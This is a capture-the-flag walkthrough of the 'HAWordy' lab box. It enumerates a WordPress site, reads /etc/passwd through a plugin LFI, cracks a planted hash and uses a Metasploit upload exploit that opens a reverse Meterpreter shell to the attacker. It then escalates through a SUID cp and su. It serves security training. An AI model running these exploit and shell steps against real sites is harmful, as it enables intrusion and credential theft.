### HAWordy
- Turning on the box gives us the ip 
```
192.168.201.23
```
- Browsing through the ip displays an apache2 default webpage
- Checking **info.php** only display the ip address
- Next check sitemap.xml, its not found. checking robots.txt is also not found
### Service Enumeration
- Results to do a service scan to find services running on the server:
```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds$ nmap -sV 192.168.201.23
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-09 17:48 EAT
Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 39.34% done; ETC: 17:49 (0:00:48 remaining)
Nmap scan report for 192.168.201.23
Host is up (0.27s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.62 seconds
```
- Only port 80 is open
- Hmm, confirming that only **http port 80** is running on the webserver,
the best step to take on forwad is to do a directory recon
### Direcory recon
- Fireup dirsearch:
```
dirsearch -u http://192.168.201.23/ -e php,html,txt -f -r --recursion-depth $depth -w /usr/share/dirb/wordlists/common.txt
```

- Directories and files discovered are:
notes.txt /wordpress etc

- Moving on to check them .i.e 192.168.201.23/notes.txt doesn't provide important info and we move on to check the wordpress directory
- Checking on it 192.168.201.23/wordpress reveals a wordpress site hosted on it.
- Some scrolling and checking on around the site does not give us useful and we resort to using **wpsscan** to recon
the wordpress site
```
wpscan --api-token (redacted api token) --url http://192.168.201.23/wordpress/ -o scans.log
```
- Output of some interesting finds:
```
[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%



[+] reflex-gallery
 | Location: http://192.168.201.23/wordpress/wp-content/plugins/reflex-gallery/
 | Last Updated: 2021-03-10T02:38:00.000Z
 | Readme: http://192.168.201.23/wordpress/wp-content/plugins/reflex-gallery/readme.txt
 | [!] The version is out of date, the latest version is 3.1.7
 | [!] Directory listing is enabled
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://192.168.201.23/wordpress/wp-content/plugins/reflex-gallery/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Reflex Gallery <= 3.1.3 - Arbitrary File Upload
 |     Fixed in: 3.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/c2496b8b-72e4-4e63-9d78-33ada3f1c674
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4133
 |      - https://www.exploit-db.com/exploits/36374/
 |      - https://packetstormsecurity.com/files/130845/
 |      - https://packetstormsecurity.com/files/131515/
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload/


[+] site-editor
 | Location: http://192.168.201.23/wordpress/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 | Readme: http://192.168.201.23/wordpress/wp-content/plugins/site-editor/readme.txt
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://192.168.201.23/wordpress/wp-content/plugins/site-editor/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.201.23/wordpress/wp-content/plugins/site-editor/readme.txt

```
(and more interesting results)

### Local File Intrusion
- I  decided to check on the LFI to see if i could get some important info and found some interesting exploit

1. https://www.exploit-db.com/exploits/50226

- Exploiting it through the url of site, decide to fetch the /etc/passwd file
```
http://192.168.201.23/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

- Output:
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false whoopsie:x:112:117::/nonexistent:/bin/false kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin saned:x:114:119::/var/lib/saned:/usr/sbin/nologin pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false raj:x:1000:1000:raj,,,:/home/raj:/bin/bash mysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/false sshd:x:124:65534::/run/sshd:/usr/sbin/nologin hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash
```
- From the output, we can see a password hash and a user hacker, hmm, possibly details the hacker forgot to clean up.
- I thus copied the hash into a file **test.txt** and used **john** to crack the hash:
```
john --wordlist=/usr/share/wordlists/rockyou.txt test.txt
```

- This reveals a user **hacker** and the password cracked was **pass123**
- Tried this on the wordpress login page but it didn't work, so i saved it for later use.
- On wordpress login tried other combinations such as **admin**, **adminuser**, **admin123**, couldn't find anything so i decided to result to user enumeration first by trying to reset the password
- Click on forgot password, and enter a random username/email, this tells us the user/username doesn't exist but trying the user **admin** tells us mail() service has been disabled thus confirming the user **admin** exists
- Checking on further, there are various ways to upload from LFI to get an RCE but i coudn't read any of the files outside the /etc folder so i resulted to putting it aside for later as a last option and try other methods.

### Reflex gallery
- Having no other lead from LFI, i decided to move on with trying to exploit the reflex gallery
- Decide to use metasploit to see if i can use it for the reflex gallery exploit:
```
msf6 > search reflex

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_reflexgallery_file_upload
```
- Set all required details and finally exploit
```
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit

[*] Started reverse TCP handler on 192.168.49.174:1444 
[+] Our payload is at: NbrIapBnSUSQ.php. Calling payload...
[*] Calling payload...
[*] Sending stage (39282 bytes) to 192.168.174.23
[+] Deleted NbrIapBnSUSQ.php
[*] Meterpreter session 1 opened (192.168.49.174:1444 -> 192.168.201.23:36356 ) at 2022-01-09 19:04:31 +0300

shell

meterpreter > 
meterpreter > shell
Process 2540 created.
Channel 0 created.
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'            
www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2022/01$ whoami
whoami
www-data
www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2022/01$ cd
cd
bash: cd: HOME not set
www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2022/01$ cd ../../../../../../../../
<ontent/uploads/2022/01$ cd ../../../../../../../../                
www-data@ubuntu:/$ ls
ls
bin    dev   initrd.img      lib64	 mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib	     media	 proc  sbin  swapfile  usr  vmlinuz.old
www-data@ubuntu:/$ 

```
- Since we now have a shell, we can now starting looking for the flag:

### Local.txt
- Finding local.txt
```
www-data@ubuntu:/$ cd home
ls
cd home
www-data@ubuntu:/home$ ls
raj
www-data@ubuntu:/home$ cd raj
cd raj
www-data@ubuntu:/home/raj$ ls
ls
Desktop    Downloads  Pictures	Templates  examples.desktop  local.txt
Documents  Music      Public	Videos	   flag1.txt	     plugin
www-data@ubuntu:/home/raj$ cat flag1.txt
cat flag1.txt
Your flag is in another file...
www-data@ubuntu:/home/raj$ cat local.txt
cat local.txt
(redacted flag)
www-data@ubuntu:/home/raj$ 
```

### Proof.txt
- The proof.txt is in the root directory but trying to access it shows we have insufficient permissions,
- Only viable solution is to privilege escalate,
### Priviledge escalation
# 1. Using Suid bits
- Find the suid bits first:
```
www-data@ubuntu:/$ cd /root
cd /root
bash: cd: /root: Permission denied
www-data@ubuntu:/$ find / -perm -u=s -type f 2>/dev/null
find find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/arping
/usr/bin/wget
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/vmware-user-suid-wrapper
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping
/bin/cp
/bin/su
/snap/core18/1754/bin/mount
/snap/core18/1754/bin/ping
/snap/core18/1754/bin/su
/snap/core18/1754/bin/umount
/snap/core18/1754/usr/bin/chfn
/snap/core18/1754/usr/bin/chsh
/snap/core18/1754/usr/bin/gpasswd
/snap/core18/1754/usr/bin/newgrp
/snap/core18/1754/usr/bin/passwd
/snap/core18/1754/usr/bin/sudo
/snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1754/usr/lib/openssh/ssh-keysign
/snap/core18/1880/bin/mount
/snap/core18/1880/bin/ping
/snap/core18/1880/bin/su
/snap/core18/1880/bin/umount
/snap/core18/1880/usr/bin/chfn
/snap/core18/1880/usr/bin/chsh
/snap/core18/1880/usr/bin/gpasswd
/snap/core18/1880/usr/bin/newgrp
/snap/core18/1880/usr/bin/passwd
/snap/core18/1880/usr/bin/sudo
/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1880/usr/lib/openssh/ssh-keysign
/snap/core/8689/bin/mount
/snap/core/8689/bin/ping
/snap/core/8689/bin/ping6
/snap/core/8689/bin/su
/snap/core/8689/bin/umount
/snap/core/8689/usr/bin/chfn
/snap/core/8689/usr/bin/chsh
/snap/core/8689/usr/bin/gpasswd
/snap/core/8689/usr/bin/newgrp
/snap/core/8689/usr/bin/passwd
/snap/core/8689/usr/bin/sudo
/snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8689/usr/lib/openssh/ssh-keysign
/snap/core/8689/usr/lib/snapd/snap-confine
/snap/core/8689/usr/sbin/pppd
/snap/core/9436/bin/mount
/snap/core/9436/bin/ping
/snap/core/9436/bin/ping6
/snap/core/9436/bin/su
/snap/core/9436/bin/umount
/snap/core/9436/usr/bin/chfn
/snap/core/9436/usr/bin/chsh
/snap/core/9436/usr/bin/gpasswd
/snap/core/9436/usr/bin/newgrp
/snap/core/9436/usr/bin/passwd
/snap/core/9436/usr/bin/sudo
/snap/core/9436/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9436/usr/lib/openssh/ssh-keysign
/snap/core/9436/usr/lib/snapd/snap-confine
/snap/core/9436/usr/sbin/pppd
www-data@ubuntu:/$ 

```

- An intresting find is the **cp** program
- This is used to copy files from one directory to another or to the same directory and since
it runs as root we can use it to copy our **proof.txt** from **/root** to our non-superuser readable directory.
```
www-data@ubuntu:/$ ls   
ls
bin    dev   initrd.img      lib64	 mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib	     media	 proc  sbin  swapfile  usr  vmlinuz.old
www-data@ubuntu:/$ cd /root
cd /root
bash: cd: /root: Permission denied
www-data@ubuntu:/$ cp /root/proof.txt proof.txt
cp /root/proof.txt proof.txt
www-data@ubuntu:/$ ls
ls
bin    etc	       lib	   mnt	      root  srv       usr
boot   home	       lib64	   opt	      run   swapfile  var
cdrom  initrd.img      lost+found  proc       sbin  sys       vmlinuz
dev    initrd.img.old  media	   proof.txt  snap  tmp       vmlinuz.old
www-data@ubuntu:/$ cat proof.txt
cat proof.txt
(redacted flag)
www-data@ubuntu:/$ 
```

# 2. Using credentials we found in /etc/passwd
- Remember we found credentials in /etc/passwd from LFI in the wordpress website earlier that we saved for later.
- Checking the /etc/passwd file reveals the user **hacker** is in the super users list.
```
www-data@ubuntu:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
....


....
gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
raj:x:1000:1000:raj,,,:/home/raj:/bin/bash
mysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:124:65534::/run/sshd:/usr/sbin/nologin
hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash
www-data@ubuntu:/$ 

```
- Thus, we can login as a superuser using the credentials we found and use them to read proof.txt
```
www-data@ubuntu:/$ su hacker
su hacker
Password: pass123

root@ubuntu:/# ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swapfile  usr  vmlinuz.old
root@ubuntu:/# cd /root 
cd /root
root@ubuntu:~# ls
ls
flag.txt  proof.txt
root@ubuntu:~# cat flag.txt
cat flag.txt
Your flag is in another file...
root@ubuntu:~# cat proof.txt
cat proof.txt
(redacted flag)
root@ubuntu:~# 

```

- And we thus solved this challenge box